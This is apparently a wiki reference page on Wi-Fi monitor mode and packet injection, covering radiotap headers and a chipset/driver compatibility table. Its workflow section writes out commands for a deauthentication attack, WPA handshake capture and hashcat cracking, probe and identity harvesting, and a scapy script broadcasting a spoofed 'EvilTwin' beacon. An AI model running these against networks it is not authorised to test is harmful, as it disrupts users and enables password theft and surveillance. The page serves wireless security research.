---
title: "Monitor Mode and Packet Injection"
permalink: /wiki/concepts/monitor-mode-injection/
layout: single
author_profile: true
tags:
  - wifi
  - concept
  - monitor-mode
  - injection
  - tooling
---

*The two radio-driver capabilities that turn a laptop into a Wi-Fi research kit. Monitor mode lets you see frames not addressed to you; injection lets you transmit arbitrary frames. The chipset / driver matrix is the perennial pain point.*

**Status:** drafting
**Related:** [802.11 frame types](/wiki/concepts/80211-frame-types/), [Frequency bands](/wiki/concepts/wifi-frequency-bands/)

---

## Operating modes

A Wi-Fi NIC can be put into one of several modes:

| Mode | What it does |
|---|---|
| **Managed (Station)** | Standard client mode — associates to an AP, processes only frames for own MAC. |
| **Master (AP)** | Acts as an AP — transmits beacons, accepts associations. |
| **Ad-hoc (IBSS)** | Peer mode without an AP. |
| **Mesh (802.11s)** | 802.11s mesh point. |
| **Monitor** | Receives all frames on the channel regardless of destination, with full radiotap header. **No association.** |

Monitor mode is sometimes called RFMON or "promiscuous mode" (the latter conflates with the L2 Ethernet sense, though the effect is similar).

## What monitor mode lets you see

With a monitor-mode interface tuned to a channel:

- All beacons, probe requests, probe responses on that channel.
- Authentication and association from any client.
- All data frames whose first address matches an AP within range.
- Control frames (RTS, CTS, ACK, Block-Ack).
- Action frames.
- Encrypted data — you see the frame, not the plaintext, unless you have the key.

You do **not** see frames on other channels. Channel hopping is the normal recon strategy: cycle through 1/6/11 (2.4 GHz) and 36/40/44/.../149/.../165 (5 GHz). Tools like `airodump-ng` channel-hop automatically.

## Radiotap headers

A monitor-mode capture prepends a **radiotap header** to each frame, encoding PHY metadata:

- RSSI (signal strength).
- Channel, frequency.
- MCS / rate.
- TSF (timestamp).
- Antenna noise.
- Bandwidth, GI, NSS (for HT/VHT/HE).

Wireshark, tcpdump, scapy all parse radiotap.

## Packet injection

The driver-side capability to *transmit* an arbitrary frame composed in user space. The kernel typically still does some header manipulation (FCS, sometimes RTS/CTS, retries) but the source/destination MACs, IEs, and payload are user-controlled.

Aircrack-ng's `aireplay-ng -9` injection test: throws a few crafted frames at a known SSID and counts ACKs. Useful sanity check.

## Chipset matrix

The classic problem: not every Wi-Fi card supports monitor mode + injection, and within a single chipset family different driver versions can behave differently. The maintained sweet spots as of 2026:

| Chipset | Linux driver | Monitor | Injection | Notes |
|---|---|---|---|---|
| Atheros AR93xx, AR94xx | `ath9k`, `ath9k_htc` | ✓ | ✓ | The reference platform. ALFA AWUS036NHA / TP-Link TL-WN722N v1. |
| Realtek RTL8812AU / RTL8814AU | `rtl8812au` (out-of-tree) | ✓ | ✓ (with the right fork) | ALFA AWUS036ACH. 5 GHz. |
| Realtek RTL8821CU | `rtl8821cu` | partial | partial | Many cheap dongles; quality varies. |
| MediaTek MT7612U / MT7610U | `mt76` | ✓ | ✓ | Increasingly recommended. |
| Intel AX2xx / AX3xx (laptop) | `iwlwifi` | ✓ | mostly ✓ for 11ac+ | Modern laptops; injection on Wi-Fi 6 is reliable since Linux 6.x. |
| Broadcom (consumer) | `brcmfmac` | poor | rare | Mostly skip. |

`airmon-ng start wlan0` flips a card into monitor mode (Linux). On modern systems also tear down `NetworkManager` first or use `airmon-ng check kill`.

## Wi-Fi 6 / 6E / 7 caveats

- 6 GHz monitor mode requires regulatory enablement (`iw reg set US` etc.) and a card with the right driver-tree.
- HE / EHT injection has gaps: building a valid HE-SIG-A field in user space is finicky; some drivers refuse non-trivial HE injection.
- 320 MHz Wi-Fi 7 monitor support is spotty as of 2026 across all open-source drivers.

## Common workflows

### Capturing a 4-way handshake

```
airmon-ng start wlan0
airodump-ng wlan0mon -c <chan> --bssid <bssid> -w handshake
# In another shell, force a deauth to trigger a fresh handshake:
aireplay-ng -0 1 -a <bssid> wlan0mon
# Then crack:
hcxpcapngtool -o hash.hc22000 handshake.cap
hashcat -m 22000 hash.hc22000 wordlist.txt
```

### Beacons / probes for surveillance

```
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=15
# Then parse:
hcxpcapngtool -E essidlist -I identitylist capture.pcapng
```

### Crafting a custom frame

```
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp
beacon = (
    RadioTap()
    / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2="aa:bb:cc:dd:ee:ff", addr3="aa:bb:cc:dd:ee:ff")
    / Dot11Beacon(cap="ESS")
    / Dot11Elt(ID="SSID", info="EvilTwin")
)
sendp(beacon, iface="wlan0mon", count=100)
```

## Common pitfalls

- **`airmon-ng` lies.** Some drivers report "monitor mode enabled" but silently filter frames not addressed to the card. Confirm with a sanity capture.
- **Regulatory domain.** A card set to FCC sees fewer 5 GHz channels than one set to ETSI; some channels need `iw reg set` to enable.
- **Power** — antenna gain helps, but transmit-side `iw set txpower` is constrained by regdomain. Don't expect 30 dBm from a USB dongle.
- **NetworkManager / wpa_supplicant interference** — kill them when going monitor.

## See also

- [802.11 frame types](/wiki/concepts/80211-frame-types/) — what monitor mode lets you see.
- [Frequency bands and channels](/wiki/concepts/wifi-frequency-bands/) — channel-hopping considerations.

## References

- Aircrack-ng wiki — *Compatibility list* — <https://www.aircrack-ng.org/doku.php?id=compatibility_drivers>
- Mathy Vanhoef — *modwifi* (modified Linux Wi-Fi stack for research) — <https://github.com/vanhoefm/modwifi>
- ALFA — chipset reference cards.
